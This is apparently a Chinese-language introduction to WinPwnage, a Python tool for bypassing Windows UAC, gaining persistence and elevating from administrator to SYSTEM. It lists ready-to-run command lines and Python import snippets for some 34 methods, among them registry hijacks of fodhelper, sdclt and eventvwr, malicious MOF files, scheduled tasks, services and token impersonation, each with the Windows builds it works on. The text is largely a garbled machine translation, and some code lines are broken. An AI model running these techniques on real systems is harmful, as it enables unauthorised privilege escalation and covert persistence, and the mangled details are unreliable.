## 一、工具介绍

WinPwnage是使用python语言开发的一款WindowsbypassUAC以及权限维持的工具，作者为rootm0s。

它具有：

扫描兼容方法  
导入和使用作为模块  
UAC绕过技术  
持久化技巧  
提升技术

GitHub地址为：

> <https://github.com/rootm0s/WinPwnage>

## 二、使用示例

### 1、要求为python3.6及更高版本以上

### 2、简单扫描：

> python main.py --scan uac

![](https://image.3001.net/images/20210106/1609938777_5ff5b7595aefe056b9c7b.png!small)

> python main.py --scan persist

![](https://image.3001.net/images/20210106/1609938889_5ff5b7c9c4e8f57642b6a.png!small)

> python main.py --scan elevate

###
![](https://image.3001.net/images/20210106/1609938962_5ff5b8124c258d47fe37e.png!small)3.绕过方法

绕过UAC使用uacMethod2

    
    
    from winpwnage.functions.uac.uacMethod2 import uacMethod2
    uacMethod2(["c:\\windows\\system32\\cmd.exe", "/k", "whoami"])

权限维持使用persistMethod4

    
    
    from winpwnage.functions.persist.persistMethod4import persistMethod4
    persistMethod4(["c:\\windows\\system32\\cmd.exe", "/k", "whoami"])

提权到管理员使用elevateMethod1

    
    
    from winpwnage.functions.persist.elevateMethod1import elevateMethod1elevateMethod1(["c:\\windows\\system32\\cmd.exe", "/k", "whoami"])

### 4.UACbypass

UAC绕过使用运行方式

  *     * Id:1
    * 方法：Windows API，这只是工作，如果UAC设置永远不要通知
    * 语法：python main.py --use uac --id 1 --payload c:\\\windows\\\system32\\\cmd.exe
    * 工作：7600
    * 固定：n/a

UAC绕过使用fodhelper.exe

  *     * Id:2
    * 方法：Registry key(Class)操纵
    * 语法：python main.py --use uac --id 2 --payload c:\\\windows\\\system32\\\cmd.exe
    * 工作：10240
    * 固定：n/a

UAC绕过使用slui.exe

  *     * Id:3
    * 方法：Registry key的关键(Class)操纵
    * 语法：python main.py --use uac --id 3 --payload c:\\\windows\\\system32\\\cmd.exe
    * 工作：9600
    * 固定：n/a

UAC绕过使用silentcleanup计划的任务

  *     * Id:4
    * 方法：Registry key(class)的操纵，这种绕过UAC总是通知。
    * 语法：python main.py --use uac --id 4 --payload c:\\\windows\\\system32\\\cmd.exe
    * 工作：9600
    * 固定：n/a

UAC bypass using sdclt.exe (isolatedcommand)

  *     * id：5
    * 方法：登记册的关键(Class)操纵
    * 语法：python main.py --use uac --id 5 --payload c:\\\windows\\\system32\\\cmd.exe
    * 工作：10240
    * 固定: 17025

UAC bypass using sdclt.exe (App Paths)

  *     * Id: 6
    * 方式: Registry key (App Paths) 操纵
    * 语法：python main.py --use uac --id 6 --payload c:\\\windows\\\system32\\\cmd.exe
    * 工作：10240
    * Fixed in: 16215

UAC bypass using perfmon.exe

  *     * Id: 7
    * 方式: Registry key (Volatile Environment)操纵
    * 语法：python main.py --use uac --id 7 --payload c:\\\windows\\\system32\\\cmd.exe
    * 工作：7600
    * 固定: 16299

UAC bypass using eventvwr.exe

  *     * Id: 8
    * 方法：Registry key(Class)操纵
    * 语法：python main.py --use uac --id 8 --payload c:\\\windows\\\system32\\\cmd.exe
    * 工作：7600
    * Fixed in: 15031

UAC bypass using compmgmtlauncher.exe

  *     * 标识：9
    * 方法：Registry key(Class)操纵
    * 语法：python main.py --use uac --id 9 --payload c:\\\windows\\\system32\\\cmd.exe
    * 工作：7600
    * Fixed in: 15031

UAC bypass using computerdefaults.exe

  *     * Id: 10
    * 方法：Registry key(Class)操纵
    * 语法：python main.py --use uac --id 10 --payload c:\\\windows\\\system32\\\cmd.exe
    * 工作：10240
    * 固定：n/a

UAC bypass using token manipulation

  *     * Id: 11
    * 方式： Token 操纵
    * 语法：python main.py --use uac --id 11 --payload c:\\\windows\\\system32\\\cmd.exe
    * 工作：7600
    * Fixed in: 17686

UAC bypass using sdclt.exe (Folder)

  *     * Id: 12
    * 方法：Registry keyClass)操纵
    * 语法：python main.py --use uac --id 12 --payload c:\\\windows\\\system32\\\cmd.exe
    * Works from: 14393
    * 固定：n/a

UAC bypass using cmstp.exe

  *     * Id:13
    * 方法：恶意ini文件
    * 语法：python main.py --use uac --id 13 --payload c:\\\windows\\\system32\\\cmd.exe
    * 工作：7600
    * 固定：n/a

UAC绕过使用wsreset.exe

  *     * Id:14
    * 方法：Registry key(Class)操纵
    * 语法：python main.py --use uac --id 14 --payload c:\\\windows\\\system32\\\cmd.exe
    * 工作：17134
    * 固定：n/a

UAC绕过使用slui.exe 和changepk.exe

  *     * Id:15
    * 方法：Registry key(Class)操纵
    * 语法：python main.py --use uac --id 15 --payload c:\\\windows\\\system32\\\cmd.exe
    * 工作：17763
    * 固定：n/a

### 5.权限维持

持久性使用mofcomp.exe (系统的权限)

  *     * Id:1
    * 方法：恶意mof文件使用EventFilter EventConsumer和结合
    * 语法：python main.py --use persist --id 1 --payload c:\\\windows\\\system32\\\cmd.exe
    * 需要：管理员权限
    * 工作：7600
    * 固定：n/a

持久性使用schtasks.exe (系统的权限)

  *     * Id:2
    * 方法：恶意计划的任务
    * 语法：python main.py --use persist --id 2 --payload c:\\\windows\\\system32\\\cmd.exe
    * 需要：管理员权限
    * 工作：7600
    * 固定：n/a

持久性使用的图像文件的执行选项magnifier.exe

  *     * Id:3
    * 方法：图像文件的执行选项调试器和辅助应用程序
    * 语法：python main.py --use persist --id 3 --payload c:\\\windows\\\system32\\\cmd.exe
    * 需要：管理员权限
    * 工作：7600
    * 固定：n/a

持久性使用userinit关键

  *     * Id:4
    * 方法：Registry key(UserInit)操纵
    * 语法：python main.py --use persist --id 4 --payload c:\\\windows\\\system32\\\cmd.exe``
    * 需要：管理员权限
    * 工作：7600
    * 固定：n/a

持久性使用HKCU运行的关键

  *     * 标识：5
    * 方法：Registry key(HKCU运行)的操纵
    * 语法：python main.py --use persist --id 5 --payload c:\\\windows\\\system32\\\cmd.exe``
    * 需要：管理员权限
    * 工作：7600
    * 固定：n/a

持久性使用HKLM运行的关键

  *     * Id: 6
    * 方法：Registry key(HKLM运行)的操纵
    * 语法：python main.py --use persist --id 6 --payload c:\\\windows\\\system32\\\cmd.exe
    * 需要：管理员权限
    * 工作：7600
    * 固定：n/a

持久性使用wmic.exe (系统的权限)

  *     * Id: 7
    * 方法：恶意mof文件使用EventFilter EventConsumer和结合
    * 语法：python main.py --use persist --id 7 --payload c:\\\windows\\\system32\\\cmd.exe
    * 需要：管理员权限
    * 工作：7600
    * 固定：n/a

持久性使用的启动文件

  *     * Id: 8
    * 方法：恶意lnk文件在启动目录
    * 语法：python main.py --use persist --id 8 --payload c:\\\windows\\\system32\\\cmd.exe
    * 需要：管理员权限
    * 工作：7600
    * 固定：n/a

持久性使用小娜的windows的应用

  *     * 标识：9
    * 方法：Registry key(Class)操纵
    * 语法：python main.py --use persist --id 9 --payload c:\\\windows\\\system32\\\cmd.exe
    * 需要：管理员权限
    * Works from: 14393
    * 固定：n/a

持久性使用人的windows的应用

  *     * Id: 10
    * 方法：Registry key(Class)操纵
    * 语法：python main.py --use persist --id 10 --payload c:\\\windows\\\system32\\\cmd.exe
    * 需要：管理员权限
    * Works from: 14393
    * 固定：n/a

持久性使用bitsadmin.exe

  *     * Id: 11
    * 方法：恶意bitsadmin的工作
    * 语法：python main.py --use persist --id 11 --payload c:\\\windows\\\system32\\\cmd.exe
    * 需要：管理员权限
    * 工作：7600
    * 固定：n/a

持久性使用的Windows服务(系统的权限)

  *     * Id: 12
    * 方法：恶意Windows服务
    * 语法：python main.py --use persist --id 12 --payload c:\\\windows\\\system32\\\cmd.exe
    * 需要：管理员权限
    * 工作：7600
    * 固定：n/a

### 6.提权

提升从管理员NT权力机构系统的使用处理继承

  *     * Id:1
    * 方法：处理遗产继承
    * 语法：python main.py --use elevate --id 1 --payload c:\\\windows\\\system32\\\cmd.exe
    * 需要：管理员权限
    * 工作：7600
    * 固定：n/a

提升从管理员NT机构系统使用的令牌模拟

  *     * Id:2
    * 方法：令牌模拟
    * 语法：python main.py --use elevate --id 2 --payload c:\\\windows\\\system32\\\cmd.exe
    * 需要：管理员权限
    * 工作：7600
    * 固定：n/a

提升从管理员NT机构系统使用的命名管道的模拟

  *     * Id:3
    * 方法：命名为管模拟
    * 语法：python main.py --use elevate --id 3 --payload c:\\\windows\\\system32\\\cmd.exe
    * 需要：管理员权限
    * 工作：7600
    * 固定：n/a

提升从管理员NT权力机构系统的使用schtasks.exe (非互动)

  *     * Id:4
    * 方法：恶意计划的任务，被删除，一旦使用
    * 语法：python main.py --use elevate --id 4 --payload c:\\\windows\\\system32\\\cmd.exe
    * 工作：7600
    * 固定：n/a

提升从管理员NT权力机构系统的使用wmic.exe (非互动)

  *     * 标识：5
    * 方法：恶意mof文件使用EventFilter EventConsumer和结合，被删除，一旦使用
    * 语法：python main.py --use elevate --id 5 --payload c:\\\windows\\\system32\\\cmd.exe
    * 需要：管理员权限
    * 工作：7600
    * 固定：n/a

提升从管理员NT机构系统采用Windows服务(非互动)

  *     * Id: 6
    * 方法：恶意Windows服务，被删除，一旦使用
    * 语法：python main.py --use elevate --id 6--payload c:\\\windows\\\system32\\\cmd.exe
    * 需要：管理员权限
    * 工作：7600
    * 固定：n/a

提升从管理员NT权力机构系统的使用mofcomp.exe (非互动)

  *     * Id: 7
    * 方法：恶意mof文件使用EventFilter EventConsumer和结合，被删除，一旦使用
    * 语法：python main.py --use elevate --id 7 --payload c:\\\windows\\\system32\\\cmd.exe
    * 需要：管理员权限
    * 工作：7600
    * 固定：n/a

### 注：以上所有的方式需扫描id的Compatible值为yes方可进行相应的操作。

